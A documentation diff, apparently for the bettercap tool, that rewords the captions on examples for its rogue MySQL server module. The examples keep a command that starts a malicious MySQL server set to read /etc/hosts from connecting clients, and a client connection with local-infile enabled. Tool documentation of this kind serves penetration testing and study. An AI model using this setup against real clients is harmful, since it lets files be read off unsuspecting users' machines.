@@ -27,13 +27,13 @@ Stop the **rogue MySQL server**.
 
 ## Examples
 
-One liner to start the server and steal `/etc/hosts` from clients connecting to your Rogue MySQL server
+Start the server and read `/etc/hosts` from connecting clients:
 
 ```bash
 sudo bettercap -eval "set mysql.server.infile /etc/hosts; mysql.server on"
 ```
 
-Now connect to your MySQL server and observe the file output on the Bettercap terminal
+Connect to test and see the file output in bettercap:
 
 ```bash
 mysql -u root -h 192.168.1.123 -pasdsasad --enable-local-infile
